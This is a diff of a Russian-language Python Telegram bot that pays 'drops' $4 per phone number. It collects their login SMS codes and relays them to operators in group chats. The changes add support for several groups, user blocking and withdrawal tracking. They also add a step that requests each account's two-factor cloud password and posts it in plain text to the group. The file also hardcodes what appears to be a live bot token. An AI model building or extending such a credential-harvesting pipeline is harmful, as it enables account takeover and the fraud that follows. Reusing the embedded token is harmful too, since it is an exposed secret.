@@ -4,7 +4,6 @@ import telebot
 from telebot import types
 
 token = "8763756243:AAFiZka2uhPxNLS27QhkfApNLPsof-s_Miw"
-chat_id = -1003839166129
 channel_id = -1003931083697
 channel_link = "https://t.me/+TFQjHfu-_KJiNDgy"
 admin_id = 8016986918
@@ -12,6 +11,10 @@ payment = 4.0
 hold = 5 * 60
 timeout_phone = 60
 timeout_kod = 3 * 60
+timeout_pwd = 3 * 60
+
+
+group_ids = [-1003839166129]  
 
 local = threading.local()
 
@@ -36,7 +39,9 @@ def setup():
             total_earned REAL DEFAULT 0.0,
             today_earned REAL DEFAULT 0.0,
             last_earning_date TEXT,
-            sub INTEGER DEFAULT 0
+            sub INTEGER DEFAULT 0,
+            blocked INTEGER DEFAULT 0,
+            pending_withdraw REAL DEFAULT 0.0
         )
     """)
     c.execute("""
@@ -46,6 +51,7 @@ def setup():
             drop_id INTEGER,
             phone TEXT,
             kod TEXT,
+            pwd TEXT,
             status TEXT DEFAULT 'wait_drop',
             msg_grp INTEGER,
             msg_thread_id INTEGER,
@@ -53,7 +59,8 @@ def setup():
             msg_drop INTEGER,
             hold_until TEXT,
             paid INTEGER DEFAULT 0,
-            created TEXT
+            created TEXT,
+            group_id INTEGER
         )
     """)
     c.execute("""
@@ -76,10 +83,22 @@ def setup():
         c.execute("ALTER TABLE users ADD COLUMN sub INTEGER DEFAULT 0")
     except: pass
     try:
+        c.execute("ALTER TABLE users ADD COLUMN blocked INTEGER DEFAULT 0")
+    except: pass
+    try:
+        c.execute("ALTER TABLE users ADD COLUMN pending_withdraw REAL DEFAULT 0.0")
+    except: pass
+    try:
         c.execute("ALTER TABLE vyvod ADD COLUMN admin_msg_id INTEGER")
     except: pass
     try:
         c.execute("ALTER TABLE orders ADD COLUMN msg_thread_id INTEGER")
+    except: pass
+    try:
+        c.execute("ALTER TABLE orders ADD COLUMN pwd TEXT")
+    except: pass
+    try:
+        c.execute("ALTER TABLE orders ADD COLUMN group_id INTEGER")
     except: pass
     c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('price', ?)", (str(payment),))
     db().commit()
@@ -100,7 +119,7 @@ def fmt(n):
 def prof(u):
     return (
         f"> 👤 *Ваш ID:* `{u['id']}`\n"
-        f"> 💳 *Баланс:* `{fmt(u['bal'] or 0)}$`\n\n"
+        f"> 💳 *Баланс:* `{fmt((u['bal'] or 0) - (u['pending_withdraw'] or 0))}$`\n\n"
         f"> — *📊 Статистика:*\n"
         f"> 💰 *Сегодня:* `{fmt(u['today_earned'] or 0)}$`\n"
         f"> 📦 *Сдано номеров:* `{u['total_orders'] or 0}`\n"
@@ -132,6 +151,8 @@ def adm_kb():
     kb.add(types.InlineKeyboardButton("Изменение цены", callback_data="adm_price"),
            types.InlineKeyboardButton("Изменение баланса", callback_data="adm_balance"),
            types.InlineKeyboardButton("Рассылка", callback_data="adm_broadcast"),
+           types.InlineKeyboardButton("Заблокировать", callback_data="adm_block"),
+           types.InlineKeyboardButton("Разблокировать", callback_data="adm_unblock"),
            types.InlineKeyboardButton("Закрыть", callback_data="adm_close"))
     return kb
 
@@ -157,6 +178,15 @@ def check_subscription(uid):
     except:
         return False
 
+def is_blocked(uid):
+    u = get_u(uid)
+    return u and u['blocked'] == 1
+
+def get_available_balance(uid):
+    u = get_u(uid)
+    if not u: return 0
+    return (u['bal'] or 0) - (u['pending_withdraw'] or 0)
+
 def worker():
     while True:
         try:
@@ -180,7 +210,7 @@ def worker():
                 c.execute("UPDATE orders SET paid=1 WHERE id=?", (oid,))
                 db().commit()
                 try:
-                    txt = f"> 💸 *Начисление\\!*\n> Номер `{ph}` успешно отстоял холд\n> *На ваш баланс было начислено:* `{int(pr)}$`\n> *Текущий баланс:* `{fmt(old+pr)}$`"
+                    txt = f"> 💸 *Начисление\\!*\n> Номер `{ph}` успешно встал\n> *На ваш баланс было начислено:* `{int(pr)}$`\n> *Текущий баланс:* `{fmt(old+pr)}$`"
                     bot.send_message(drop, txt, parse_mode="MarkdownV2", reply_markup=hide_kb())
                 except: pass
         except Exception as e: print(e); time.sleep(5)
@@ -198,7 +228,7 @@ def phone_tm(oid, cid, mid):
             db().commit()
             try: bot.edit_message_text("⌛ Время вышло. Заявка отменена.", cid, mid, reply_markup=hide_kb())
             except: pass
-            bot.send_message(chat_id, f"⏰ Дроп не ввёл номер за 1 мин. Заявка #{oid} отменена.", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
+            bot.send_message(o['group_id'], f"⏰ Дроп не ввёл номер за 1 мин. Заявка #{oid} отменена.", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
     except: pass
 
 def code_tm(oid, cid, mid):
@@ -213,7 +243,23 @@ def code_tm(oid, cid, mid):
             db().commit()
             try: bot.edit_message_text("⌛ Время вышло. Заявка отменена.", cid, mid, reply_markup=hide_kb())
             except: pass
-            bot.send_message(chat_id, f"⏰ Дроп не ввёл код за 3 мин. Заявка #{oid} отменена.", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
+            bot.send_message(o['group_id'], f"⏰ Дроп не ввёл код за 3 мин. Заявка #{oid} отменена.", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
+            bot.send_message(o['drop_id'], "> ❌ Время вышло\\. Заявка отменена\\.", parse_mode="MarkdownV2")
+    except: pass
+
+def pwd_tm(oid, cid, mid):
+    time.sleep(timeout_pwd)
+    try:
+        c = db().cursor()
+        c.execute("SELECT * FROM orders WHERE id=?", (oid,))
+        o = c.fetchone()
+        if o and o['status'] == 'wait_pwd':
+            c.execute("UPDATE orders SET status='cancel' WHERE id=?", (oid,))
+            c.execute("UPDATE users SET state=NULL WHERE id=?", (o['drop_id'],))
+            db().commit()
+            try: bot.edit_message_text("⌛ Время вышло. Заявка отменена.", cid, mid, reply_markup=hide_kb())
+            except: pass
+            bot.send_message(o['group_id'], f"⏰ Дроп не ввёл пароль за 3 мин. Заявка #{oid} отменена.", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
             bot.send_message(o['drop_id'], "> ❌ Время вышло\\. Заявка отменена\\.", parse_mode="MarkdownV2")
     except: pass
 
@@ -232,10 +278,10 @@ def set_st(uid, s, t=None):
     c.execute("UPDATE users SET state=?, temp=? WHERE id=?", (s, t, uid))
     db().commit()
 
-def new_o(cold, th=None):
+def new_o(cold, th=None, gid=None):
     c = db().cursor()
     cr = datetime.now().isoformat()
-    c.execute("INSERT INTO orders (cold_id, status, created, msg_thread_id) VALUES (?, 'wait_drop', ?, ?)", (cold, cr, th))
+    c.execute("INSERT INTO orders (cold_id, status, created, msg_thread_id, group_id) VALUES (?, 'wait_drop', ?, ?, ?)", (cold, cr, th, gid))
     db().commit()
     return c.lastrowid
 
@@ -254,6 +300,9 @@ def upd_o(oid, **kw):
 def show_prof(uid, edit=None):
     u = get_u(uid)
     if not u: return
+    if u['blocked'] == 1:
+        bot.send_message(uid, "> ❌ *Вы заблокированы за нарушение правил бота\\.*", parse_mode="MarkdownV2")
+        return
     t = prof(u)
     if edit:
         try: bot.edit_message_text(t, uid, edit, parse_mode="MarkdownV2", reply_markup=prof_kb())
@@ -294,6 +343,20 @@ def adm_broadcast(c):
     set_st(c.from_user.id, "adm_wait_broadcast")
     bot.answer_callback_query(c.id)
 
+@bot.callback_query_handler(func=lambda c: c.data == "adm_block")
+def adm_block(c):
+    if c.from_user.id != admin_id: return
+    bot.send_message(c.message.chat.id, "Введите ID пользователя для блокировки:")
+    set_st(c.from_user.id, "adm_wait_block")
+    bot.answer_callback_query(c.id)
+
+@bot.callback_query_handler(func=lambda c: c.data == "adm_unblock")
+def adm_unblock(c):
+    if c.from_user.id != admin_id: return
+    bot.send_message(c.message.chat.id, "Введите ID пользователя для разблокировки:")
+    set_st(c.from_user.id, "adm_wait_unblock")
+    bot.answer_callback_query(c.id)
+
 @bot.message_handler(func=lambda m: m.from_user.id == admin_id and m.reply_to_message is not None)
 def adm_reply(m):
     t = m.reply_to_message.text or ""
@@ -309,7 +372,7 @@ def adm_reply(m):
     txt = f"> 💳 *Чек на выплату:*\n> {chk}\n> \n> — 👨‍💻 *Спасибо за доверие к нашему сервису\\!*"
     bot.send_message(r['user_id'], txt, parse_mode="MarkdownV2")
     c.execute("UPDATE vyvod SET status='done' WHERE id=?", (rid,))
-    c.execute("UPDATE users SET bal = bal - ? WHERE id=?", (r['summa'], r['user_id']))
+    c.execute("UPDATE users SET bal = bal - ?, pending_withdraw = pending_withdraw - ? WHERE id=?", (r['summa'], r['summa'], r['user_id']))
     db().commit()
     bot.send_message(admin_id, f"✅ Чек отправлен, заявка #{rid} выполнена")
 
@@ -331,6 +394,10 @@ def start(m):
     add_u(uid, m.from_user.full_name, m.from_user.username)
     if m.chat.id != uid: return
     
+    if is_blocked(uid):
+        bot.send_message(uid, "> ❌ *Вы заблокированы за нарушение правил бота\\.*", parse_mode="MarkdownV2")
+        return
+    
     if not check_subscription(uid):
         txt = "> *Перед тем как начать использовать бота, подпишитесь на канал с заявками\\!*"
         bot.send_message(uid, txt, parse_mode="MarkdownV2", reply_markup=sub_kb())
@@ -346,9 +413,12 @@ def start(m):
             oid = int(t.split('order_')[1])
             o = get_o(oid)
             if not o or o['status'] != 'wait_drop': show_prof(uid); return
+            if is_blocked(uid):
+                bot.send_message(uid, "> ❌ *Вы заблокированы за нарушение правил бота\\.*", parse_mode="MarkdownV2")
+                return
             upd_o(oid, drop_id=uid, status='wait_phone')
             uinf = f"@{m.from_user.username}" if m.from_user.username else f"id{uid}"
-            bot.send_message(chat_id, f"<b>Заявка #{oid}</b>\n\n<b>📥 {uinf} [<code>{uid}</code>]</b>\n<b>Ждём номер телефона...</b>", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
+            bot.send_message(o['group_id'], f"<b>Заявка #{oid}</b>\n\n<b>📥 {uinf} [<code>{uid}</code>]</b>\n<b>Ждём номер телефона...</b>", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
             if o['msg_kanal']:
                 try: bot.delete_message(channel_id, o['msg_kanal'])
                 except: pass
@@ -362,13 +432,16 @@ def start(m):
 
 @bot.message_handler(func=lambda m: m.chat.id == m.from_user.id and m.text == "Меню")
 def menu_cmd(m):
+    if is_blocked(m.from_user.id):
+        bot.send_message(m.from_user.id, "> ❌ *Вы заблокированы за нарушение правил бота\\.*", parse_mode="MarkdownV2")
+        return
     if not check_subscription(m.from_user.id):
         txt = "> *Перед тем как начать использовать бота, подпишитесь на канал с заявками\\!*"
         bot.send_message(m.from_user.id, txt, parse_mode="MarkdownV2", reply_markup=sub_kb())
         return
     show_prof(m.from_user.id)
 
-@bot.message_handler(func=lambda m: m.chat.id == chat_id and m.text and m.text.lower() == "ворк")
+@bot.message_handler(func=lambda m: m.chat.id in group_ids and m.text and m.text.lower() == "ворк")
 def work(m):
     kb = types.InlineKeyboardMarkup()
     kb.add(types.InlineKeyboardButton("📞 Запросить номер", callback_data="req_number"))
@@ -376,8 +449,8 @@ def work(m):
 
 @bot.callback_query_handler(func=lambda c: c.data == "req_number")
 def req_num(c):
-    if c.message.chat.id != chat_id: bot.answer_callback_query(c.id, "❌ Не та группа", show_alert=True); return
-    oid = new_o(c.from_user.id, c.message.message_thread_id)
+    if c.message.chat.id not in group_ids: bot.answer_callback_query(c.id, "❌ Не та группа", show_alert=True); return
+    oid = new_o(c.from_user.id, c.message.message_thread_id, c.message.chat.id)
     kb = types.InlineKeyboardMarkup()
     kb.add(types.InlineKeyboardButton("📱 Сдать номер", url=f"https://t.me/{(bot.get_me().username)}?start=order_{oid}"))
     msg = bot.send_message(channel_id, "<b>🔥 Срочно нужен номер!</b>\n<i>⏳ Кто первый нажмет, того и заявка.</i>", reply_markup=kb)
@@ -398,7 +471,7 @@ def cancel_ph(c):
     upd_o(oid, status='cancel')
     set_st(c.from_user.id, None)
     bot.edit_message_text("> ❌ *Вы отменили номер\\.*\n> *Заявка закрыта\\.*", c.message.chat.id, c.message.message_id, parse_mode="MarkdownV2", reply_markup=hide_kb())
-    bot.send_message(chat_id, f"❌ Дроп отменил ввод номера. Заявка #{oid} отменена.", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
+    bot.send_message(o['group_id'], f"❌ Дроп отменил ввод номера. Заявка #{oid} отменена.", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
     bot.answer_callback_query(c.id)
 
 @bot.callback_query_handler(func=lambda c: c.data == "hide_msg")
@@ -409,6 +482,10 @@ def text_h(m):
     uid = m.from_user.id
     u = get_u(uid)
     if not u and uid != admin_id: return
+    
+    if uid != admin_id and is_blocked(uid):
+        bot.send_message(uid, "> ❌ *Вы заблокированы за нарушение правил бота\\.*", parse_mode="MarkdownV2")
+        return
     
     if uid != admin_id and not check_subscription(uid):
         txt = "> *Перед тем как начать использовать бота, подпишитесь на канал с заявками\\!*"
@@ -443,10 +520,10 @@ def text_h(m):
             db().commit()
             if amt > 0:
                 act = "начислено"
-                txt = f"> 💰 *На ваш баланс было начислено:* `{amt:.0f}$`\n> *Текущий баланс:* `{fmt(tgt['bal']+amt)}$`"
+                txt = f"> 💰 *На ваш баланс было начислено:* `{amt:.0f}$`\n> *Текущий баланс:* `{fmt((tgt['bal']+amt) - (tgt['pending_withdraw'] or 0))}$`"
             else:
                 act = "списано"
-                txt = f"> 💸 *С вашего баланса было списано:* `{abs(amt):.0f}$`\n> *Текущий баланс:* `{fmt(tgt['bal']+amt)}$`"
+                txt = f"> 💸 *С вашего баланса было списано:* `{abs(amt):.0f}$`\n> *Текущий баланс:* `{fmt((tgt['bal']+amt) - (tgt['pending_withdraw'] or 0))}$`"
             bot.send_message(uid, f"✅ Пользователю {tid} {act} {abs(amt)}$")
             try: bot.send_message(tid, txt, parse_mode="MarkdownV2")
             except: pass
@@ -462,6 +539,28 @@ def text_h(m):
                 except: pass
             bot.send_message(uid, f"✅ Рассылка завершена. Отправлено {sent} пользователям.")
             set_st(uid, None); return
+        if st == "adm_wait_block":
+            try:
+                tid = int(m.text.strip())
+            except: bot.send_message(uid, "❌ Неверный ID"); return
+            c = db().cursor()
+            c.execute("UPDATE users SET blocked=1 WHERE id=?", (tid,))
+            db().commit()
+            bot.send_message(uid, f"✅ Пользователь {tid} заблокирован")
+            try: bot.send_message(tid, "> ❌ *Вы заблокированы за нарушение правил бота\\.*", parse_mode="MarkdownV2")
+            except: pass
+            set_st(uid, None); return
+        if st == "adm_wait_unblock":
+            try:
+                tid = int(m.text.strip())
+            except: bot.send_message(uid, "❌ Неверный ID"); return
+            c = db().cursor()
+            c.execute("UPDATE users SET blocked=0 WHERE id=?", (tid,))
+            db().commit()
+            bot.send_message(uid, f"✅ Пользователь {tid} разблокирован")
+            try: bot.send_message(tid, "> ✅ *Вы разблокированы\\.*", parse_mode="MarkdownV2")
+            except: pass
+            set_st(uid, None); return
 
     if not u: return
 
@@ -476,10 +575,12 @@ def text_h(m):
         kb = types.InlineKeyboardMarkup(row_width=1)
         kb.add(types.InlineKeyboardButton("📲 Отправил код", callback_data=f"c_kod_{oid}"),
                types.InlineKeyboardButton("✅ Встал", callback_data=f"c_ok_{oid}"),
-               types.InlineKeyboardButton("❌ Слетел", callback_data=f"c_no_{oid}"))
+               types.InlineKeyboardButton("❌ Слетел", callback_data=f"c_no_{oid}"),
+               types.InlineKeyboardButton("⏭ Пропустить", callback_data=f"c_skip_{oid}"),
+               types.InlineKeyboardButton("🔐 Установлен пароль", callback_data=f"c_pwd_{oid}"))
         uinf = f"@{u['username']}" if u['username'] else f"id{uid}"
         try:
-            msg = bot.send_message(chat_id, f"<b>📱 Заявка #{oid}</b>\n\n<b>{uinf} [<code>{uid}</code>]</b>\n<b>Номер:</b> <code>{clean}</code>", reply_markup=kb, message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
+            msg = bot.send_message(o['group_id'], f"<b>📱 Заявка #{oid}</b>\n\n<b>{uinf} [<code>{uid}</code>]</b>\n<b>Номер:</b> <code>{clean}</code>", reply_markup=kb, message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
             upd_o(oid, msg_grp=msg.message_id)
         except: bot.send_message(uid, "❌ Ошибка связи с группой. Попробуйте позже."); return
         if o['msg_drop']:
@@ -495,8 +596,19 @@ def text_h(m):
         kod = m.text.strip()
         upd_o(oid, kod=kod, status='kod_entered')
         uinf = f"@{u['username']}" if u['username'] else f"id{uid}"
-        bot.send_message(chat_id, f"<b>📱 Заявка #{oid}</b>\n\n<b>{uinf} [<code>{uid}</code>]</b>\n<b>Код:</b> <code>{kod}</code>", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
+        bot.send_message(o['group_id'], f"<b>📱 Заявка #{oid}</b>\n\n<b>{uinf} [<code>{uid}</code>]</b>\n<b>Код:</b> <code>{kod}</code>", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
         bot.send_message(uid, "> ✅ Код отправлен\\. Ожидайте подтверждения\\.", parse_mode="MarkdownV2")
+        set_st(uid, None); return
+
+    if st and st.startswith("wait_pwd_"):
+        oid = int(st.split("_")[2])
+        o = get_o(oid)
+        if not o or o['drop_id'] != uid: bot.send_message(uid, "Заявка не найдена"); return
+        pwd = m.text.strip()
+        upd_o(oid, pwd=pwd, status='pwd_entered')
+        uinf = f"@{u['username']}" if u['username'] else f"id{uid}"
+        bot.send_message(o['group_id'], f"<b>📱 Заявка #{oid}</b>\n\n<b>{uinf} [<code>{uid}</code>]</b>\n<b>Пароль:</b> <code>{pwd}</code>", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
+        bot.send_message(uid, "> ✅ Пароль отправлен\\. Ожидайте подтверждения\\.", parse_mode="MarkdownV2")
         set_st(uid, None); return
 
     if st == "wait_sum":
@@ -504,15 +616,20 @@ def text_h(m):
             s = float(m.text.replace(',', '.'))
             if s <= 0: raise
         except: bot.send_message(uid, "❌ Введи число больше 0"); return
-        if s > u['bal']: bot.send_message(uid, f"> ❌ *Недостаточно средств\\!*\n> Ваш баланс: `{fmt(u['bal'])}$`", parse_mode="MarkdownV2"); set_st(uid, None); return
+        avail = get_available_balance(uid)
+        if s > avail: bot.send_message(uid, f"> ❌ *Недостаточно средств\\!*\n> Доступный баланс: `{fmt(avail)}$`", parse_mode="MarkdownV2"); set_st(uid, None); return
+        
         c = db().cursor()
+        c.execute("UPDATE users SET pending_withdraw = pending_withdraw + ? WHERE id=?", (s, uid))
         c.execute("INSERT INTO vyvod (user_id, summa, status, created) VALUES (?, ?, 'wait', ?)", (uid, s, datetime.now().isoformat()))
         db().commit()
         rid = c.lastrowid
+        
         uinf = f"@{u['username']}" if u['username'] else f"id{uid}"
         msg = bot.send_message(admin_id, f"> 💰 *Заявка на вывод \\#{rid}*\n> \n> *Ник:* {uinf}\n> *Юз/айди:* `{uid}`\n> *Вывод:* `{fmt(s)}$`\n> \n> _Ответьте на это сообщение ссылкой на чек_", parse_mode="MarkdownV2")
         c.execute("UPDATE vyvod SET admin_msg_id=? WHERE id=?", (msg.message_id, rid))
         db().commit()
+        
         bot.send_message(uid, f"> ✅ Заявка на вывод `{fmt(s)}$` создана\\. Ожидайте чек\\.", parse_mode="MarkdownV2")
         set_st(uid, None); return
 
@@ -525,6 +642,7 @@ def cold_acts(c):
     o = get_o(oid)
     if not o: bot.answer_callback_query(c.id, "❌ Заявка не найдена", show_alert=True); return
     if o['cold_id'] != c.from_user.id: bot.answer_callback_query(c.id, "❌ Только создатель заявки может управлять", show_alert=True); return
+    
     if act == "kod":
         if o['status'] not in ('wait_kod','kod_entered'): bot.answer_callback_query(c.id, "❌ Статус не позволяет", show_alert=True); return
         upd_o(oid, status='wait_kod')
@@ -536,19 +654,53 @@ def cold_acts(c):
         upd_o(oid, msg_drop=msg.message_id)
         threading.Thread(target=code_tm, args=(oid, o['drop_id'], msg.message_id), daemon=True).start()
         bot.answer_callback_query(c.id, "✅ Запрос кода отправлен дропу", show_alert=True)
+        
     elif act == "ok":
-        if o['status'] not in ('wait_kod','kod_entered'): bot.answer_callback_query(c.id, "❌ Статус не позволяет", show_alert=True); return
+        if o['status'] not in ('wait_kod','kod_entered','pwd_entered'): bot.answer_callback_query(c.id, "❌ Статус не позволяет", show_alert=True); return
         upd_o(oid, status='done', hold_until=(datetime.now()+timedelta(seconds=hold)).isoformat())
         pr = get_price()
         bot.send_message(o['drop_id'], f"> ✅ Номер встал\\. Через 5 минут на ваш баланс будет начислено `{int(pr)}$`", parse_mode="MarkdownV2")
-        bot.send_message(chat_id, f"✅ Заявка #{oid} — номер встал.", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
+        bot.send_message(o['group_id'], f"✅ Заявка #{oid} — номер встал.", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
         bot.answer_callback_query(c.id, "✅ Готово", show_alert=True)
+        
     elif act == "no":
         upd_o(oid, status='cancel')
         set_st(o['drop_id'], None)
         bot.send_message(o['drop_id'], "> ❌ Номер слетел\\. Попробуйте другую заявку\\.", parse_mode="MarkdownV2")
-        bot.send_message(chat_id, f"❌ Заявка #{oid} — номер слетел.", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
+        bot.send_message(o['group_id'], f"❌ Заявка #{oid} — номер слетел.", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
         bot.answer_callback_query(c.id)
+        
+    elif act == "skip":
+        upd_o(oid, status='cancel')
+        set_st(o['drop_id'], None)
+        txt = (
+            f"> ❌ *Номер отклонен\\!*\n"
+            f"> Номер `{o['phone']}` помечен как невалидный\\. Заявка закрыта\\.\n"
+            f"> *Возможная причина:* номер заблокирован, слишком много попыток, неверный код\\."
+        )
+        bot.send_message(o['drop_id'], txt, parse_mode="MarkdownV2")
+        bot.send_message(o['group_id'], f"⏭ Заявка #{oid} пропущена.", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
+        bot.answer_callback_query(c.id, "Заявка пропущена")
+        
+    elif act == "pwd":
+        if o['status'] not in ('wait_kod','kod_entered'): bot.answer_callback_query(c.id, "❌ Статус не позволяет", show_alert=True); return
+        upd_o(oid, status='wait_pwd')
+        txt = (
+            f"> *\\#{oid}*\n"
+            f"> \n"
+            f"> 🔐 *Внимание\\!*\n"
+            f"> На аккаунте `{o['phone']}` установлен облачный пароль\\.\n"
+            f"> Пожалуйста, отправьте его в течение *3 минут*\\.\n"
+            f"> \n"
+            f"> Выберите действие:"
+        )
+        kb = types.InlineKeyboardMarkup(row_width=1)
+        kb.add(types.InlineKeyboardButton("✅ Ввести пароль", callback_data=f"d_pwd_{oid}"),
+               types.InlineKeyboardButton("❎ Не могу предоставить", callback_data=f"d_nopwd_{oid}"))
+        msg = bot.send_message(o['drop_id'], txt, parse_mode="MarkdownV2", reply_markup=kb)
+        upd_o(oid, msg_drop=msg.message_id)
+        threading.Thread(target=pwd_tm, args=(oid, o['drop_id'], msg.message_id), daemon=True).start()
+        bot.answer_callback_query(c.id, "✅ Запрос пароля отправлен дропу", show_alert=True)
 
 @bot.callback_query_handler(func=lambda c: c.data.startswith("d_"))
 def drop_acts(c):
@@ -556,6 +708,7 @@ def drop_acts(c):
     act, oid = d[1], int(d[2])
     o = get_o(oid)
     if not o or o['drop_id'] != c.from_user.id: bot.answer_callback_query(c.id, "❌ Не ваша заявка", show_alert=True); return
+    
     if act == "kod":
         try: bot.delete_message(c.message.chat.id, c.message.message_id)
         except: pass
@@ -563,16 +716,34 @@ def drop_acts(c):
         upd_o(oid, msg_drop=msg.message_id)
         set_st(c.from_user.id, f"wait_sms_{oid}")
         bot.answer_callback_query(c.id)
+        
     elif act == "rep":
         o = get_o(oid)
-        bot.send_message(chat_id, f"🔄 Дроп запросил повторную отправку кода для заявки #{oid}", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
+        bot.send_message(o['group_id'], f"🔄 Дроп запросил повторную отправку кода для заявки #{oid}", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
         bot.answer_callback_query(c.id, "✅ Холодка уведомлена", show_alert=True)
+        
     elif act == "cancel":
         upd_o(oid, status='cancel')
         set_st(c.from_user.id, None)
         try: bot.edit_message_text("> ❌ *Вы отменили номер\\.*\n> *Заявка закрыта\\.*", c.message.chat.id, c.message.message_id, parse_mode="MarkdownV2", reply_markup=hide_kb())
         except: bot.send_message(c.from_user.id, "> ❌ *Вы отменили номер\\.*\n> *Заявка закрыта\\.*", parse_mode="MarkdownV2", reply_markup=hide_kb())
-        bot.send_message(chat_id, f"❌ Дроп отказался дать код. Заявка #{oid} отменена.", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
+        bot.send_message(o['group_id'], f"❌ Дроп отказался дать код. Заявка #{oid} отменена.", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
+        bot.answer_callback_query(c.id)
+        
+    elif act == "pwd":
+        try: bot.delete_message(c.message.chat.id, c.message.message_id)
+        except: pass
+        msg = bot.send_message(c.from_user.id, f"> 🔐 *Жду пароль\\!*\n> Пожалуйста, отправьте пароль в ответ на это сообщение\\.", parse_mode="MarkdownV2")
+        upd_o(oid, msg_drop=msg.message_id)
+        set_st(c.from_user.id, f"wait_pwd_{oid}")
+        bot.answer_callback_query(c.id)
+        
+    elif act == "nopwd":
+        upd_o(oid, status='cancel')
+        set_st(c.from_user.id, None)
+        try: bot.edit_message_text("> ❌ *Вы не можете предоставить пароль\\.*\n> *Заявка закрыта\\.*", c.message.chat.id, c.message.message_id, parse_mode="MarkdownV2", reply_markup=hide_kb())
+        except: bot.send_message(c.from_user.id, "> ❌ *Вы не можете предоставить пароль\\.*\n> *Заявка закрыта\\.*", parse_mode="MarkdownV2", reply_markup=hide_kb())
+        bot.send_message(o['group_id'], f"❌ Дроп не может предоставить пароль. Заявка #{oid} отменена.", message_thread_id=o['msg_thread_id'] if o['msg_thread_id'] else None)
         bot.answer_callback_query(c.id)
 
 @bot.callback_query_handler(func=lambda c: c.data == "vyvod_zapros")
@@ -580,8 +751,12 @@ def vyvod(c):
     uid = c.from_user.id
     u = get_u(uid)
     if not u: return
-    if u['bal'] <= 0: bot.answer_callback_query(c.id, "‼️ Баланс пуст", show_alert=True); return
-    txt = f"> 💸 *Вывод средств*\n> \n> Доступно: `{fmt(u['bal'])}$`\n> \n> ✍️ *Введите сумму для вывода*"
+    if u['blocked'] == 1: bot.answer_callback_query(c.id, "❌ Вы заблокированы", show_alert=True); return
+    
+    avail = get_available_balance(uid)
+    if avail <= 0: bot.answer_callback_query(c.id, "‼️ Баланс пуст", show_alert=True); return
+    
+    txt = f"> 💸 *Вывод средств*\n> \n> Доступно: `{fmt(avail)}$`\n> \n> ✍️ *Введите сумму для вывода*"
     try: bot.edit_message_text(txt, uid, c.message.message_id, parse_mode="MarkdownV2", reply_markup=back_kb())
     except: bot.send_message(uid, txt, parse_mode="MarkdownV2", reply_markup=back_kb())
     set_st(uid, "wait_sum")
